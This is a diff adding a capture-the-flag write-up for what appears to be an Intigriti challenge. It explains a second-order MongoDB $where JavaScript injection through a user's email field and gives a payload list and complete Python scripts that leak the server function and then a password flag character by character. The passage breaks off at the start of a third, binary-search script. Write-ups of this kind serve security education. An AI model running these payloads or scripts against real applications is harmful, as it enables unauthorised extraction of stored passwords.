@@ -1,0 +1,272 @@
+I tried a lot of payloads after knowing that the injection point is the email.
+
+When you updating your email address, there is a validation in the back-end but it's weak, anything starts with a valid email can bypass the check. For example, `abc@abc.com' --` is also a valid email.
+
+Following is a few payloads I have tried:
+
+1. `abc@abc.com' --`
+2. `abc@abc.com' #`
+3. `abc@abc.com' /*`
+4. `abc@abc.com' //`
+5. `abc@abc.com" --`
+6. `abc@abc.com" #`
+7. `abc@abc.com" /*`
+8. `abc@abc.com" //`
+9. `abc@abc.com' + '1`
+10. `abc@abc.com" + "1`
+11. `abc@abc.com" + version() + "1`
+
+I thought it's SQL injection at first, but after trying for about an hour, I started to think it's not.
+
+Because the comment and the function seems not working, but somehow the string concatenation always works, so I am sure that it's injectable.
+
+I did a little experiment to make sure I am on the right track.
+
+I created another user(user03) and update email to `abc@abc.com1`, then update user01's email to `abc@abc.com" + "1`.
+
+When search for user01, the result is user03, which means the injection is success.
+
+Suddenly, an idea came to my mind: "maybe try JavaScript?", so I tried `abc@abc.com" + this + "1`, no error.
+
+Then, I tried `abc@abc.com" + String.fromCharCode(49) + "`, the result is still user03, bingo! (`ascii('1') = 49`)
+
+Now, I know that it's part of JavaScript, what to do next?
+
+I tried to manually search what is available by using a boolean-based injection.
+
+For example, `abc@abc.com" + (require ? "1" : "2") + "`, if `require` is available, the user with email `abc@abc.com1` is returned(which is user03), otherwise it returns `null` because email `abc@abc.com2` is not exist.
+
+I found that `arguments` is available, which means we are in a function, so I want to know what is the function body.
+
+How do we get function body without knowing the function name? Some JavaScript magic! `arguments.callee.toString()` is the answer.
+
+We can use the same way to leak the content, like `abc@abc.com" + (arguments.callee.toString()[0] === "a" ? "1" : "2") + "` but it's quite slow, there is a better way.
+
+First, we create what I called `oracle account`, like the following:
+
+1. account_oracle_0 with email test@oracle.com0
+2. account_oracle_1 with email test@oracle.com1
+3. ...
+4. account_oracle_a with email test@oracle.coma
+5. account_oracle_z with email test@oracle.comz
+
+
+Then, we create another account(say user_leak) with email `test@oracle.com" + arguments.callee.toString()[0]+ "`
+
+If the result of searching user_leak is `account_oracle_a`, then I know that the first character is `a`.
+
+Here is the full exploit script to leak the function body:
+
+```py
+import requests
+import json
+import concurrent.futures
+import string
+
+BASE_URL = 'https://challenge-0123.intigriti.io'
+LOGIN_URL = BASE_URL + '/login.html'
+EDIT_URL = BASE_URL + '/editor.html'
+QUERY_URL = BASE_URL + '/api/friends?q='
+
+SKIP_CREATE_ORACLE = 0
+MAX_WORKERS = 15
+charset = string.printable
+
+def create_oracle(c):
+  session = requests.session()
+  session.post(LOGIN_URL, data={
+    "username": "account_oracle_" + c,
+    "password": "account_oracle_" + c,
+  })
+  resp = session.post(EDIT_URL, data={
+    "email": "test@oracle.com" + c
+  })
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+
+def leak_char(index):
+  payload = f'test@oracle.com" + (arguments.callee.toString()[{index}]) +"'
+  session = requests.session()
+
+  name = "account_get_" + str(index)
+
+  session.post(LOGIN_URL, data={
+    "username": name,
+    "password": name
+  })
+  session.post(EDIT_URL, data={
+    "email": payload
+  })
+
+  resp = requests.get(QUERY_URL + name)
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+    return '#'
+
+  if resp.text == 'null':
+    print('Failed')
+    return '#'
+
+  data = json.loads(resp.text)
+  char = data["username"].replace('account_oracle_', '')
+  return char
+
+if SKIP_CREATE_ORACLE == False:
+  print("create oracle account...")
+  total = len(charset)
+  current = 0
+  with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+      futures = {executor.submit(create_oracle, c): c for c in charset}
+      for future in concurrent.futures.as_completed(futures):
+          current += 1
+          if current % 10 == 0 or current == total:
+            print(f"Progress: {current}/{total}")
+
+print("leaking function body")
+length = 100
+ans = [' '] * length
+with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+    futures = {executor.submit(leak_char, i): i for i in range(length)}
+    for future in concurrent.futures.as_completed(futures):
+        index = futures[future]
+        data = future.result()
+        ans[index] = data
+        print("".join(ans))
+
+
+
+```
+
+The result is:
+
+``` js
+function () { return this.email == "test@oracle.com" + (arguments.callee.toString()[85]) +"" }
+```
+
+So, we can assumed that the code in the back-end is something like this:
+
+``` js
+const payload = 'YOUR_EMAIL'
+
+db.find({
+  $where: `this.email === "${payload}"`
+}).then(result => {
+  res.json(result)
+})
+```
+
+It's not possible to do RCE here because the JS code is sandboxed by MongoDB.
+
+We can also use the similar way to see what `this` have, just change the payload from `arguments.callee.toString()` to `Object.keys[this]`, the result is:
+
+1. id
+2. username
+3. password
+4. friends
+5. email
+
+After knowing all the information we need, we can start to leak the flag slowly with following payload:
+
+```
+not@not_exist.ext" || (this.password.startsWith("INTIGRITI") && this.password[0] === "A" ) && "" == "
+```
+
+It creates following function:
+
+```js
+function() {
+  return this.email === "not@not_exist.ext" || 
+  (this.password.startsWith("INTIGRITI{") && this.password[10] === "A") &&
+  "" = ""
+}
+```
+
+When `this.password.startsWith("INTIGRITI{") && this.password[10] === "A"` is false, search result is `null` because nothing matched.
+
+Otherwise, the user with matched pattern will be returned. 
+
+Here is the exploit script to leak the flag char by char:
+
+``` py
+import requests
+import json
+import concurrent.futures
+import string
+
+BASE_URL = 'https://challenge-0123.intigriti.io'
+LOGIN_URL = BASE_URL + '/login.html'
+EDIT_URL = BASE_URL + '/editor.html'
+QUERY_URL = BASE_URL + '/api/friends?q='
+
+SKIP_CREATE_ORACLE = 0
+MAX_WORKERS = 15
+charset = string.printable
+
+def leak_flag(index, char):
+  session = requests.session()
+  payload = f'not@not_exist.ext" || (this.password.startsWith("INTIGRITI") && this.password[{index}] === "{char}" ) && "" == "'
+
+  name = 'account_flag_'  + char
+
+  session.post(LOGIN_URL, data={
+    "username": name,
+    "password": name
+  })
+  session.post(EDIT_URL, data={
+    "email": payload
+  })
+
+  resp = requests.get(QUERY_URL + name)
+  if resp.status_code != 200:
+    return False
+
+  if resp.text == 'null' or resp.text == '[]\n':
+    return False
+
+  return char
+
+print("leaking flag")
+flag = "INTIGRITI{"
+current = len(flag)
+while len(flag) == 0 or flag[-1] != '}':
+  should_break = False
+  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+      futures = {executor.submit(leak_flag, current, c): c for c in charset}
+      for future in concurrent.futures.as_completed(futures):
+          index = futures[future]
+          data = future.result()
+          if data != False and not should_break:
+            flag += data
+            should_break = True
+            print(current, flag)
+  current += 1
+
+print("done")
+exit()
+```
+
+![leak char by char](/img/intigriti-0123-second-order-injection/p2.png)
+
+It takes around 10~15s to leak one character.
+
+Can we go faster? Sure!
+
+## Binary search to the rescue
+
+It's boolean-based injection, the result is either found or not found, we can apply binary search to make it way faster.
+
+It's easier to use char code to do the binary search. Also, I assumed that we know the length of flag beforehand because it's easier(we can still leak the length first in practical but I am lazy to implement it)
+
+```py
+import requests
+import json
+import concurrent.futures
+import string
+import time
+
+BASE_URL = 'https://challenge-0123.intigriti.io'
+LOGIN_URL = BASE_URL + '/login.html'
+EDIT_URL = BASE_URL + '/editor.html'
+QUERY_URL = BASE_URL + '/api/friends?q='
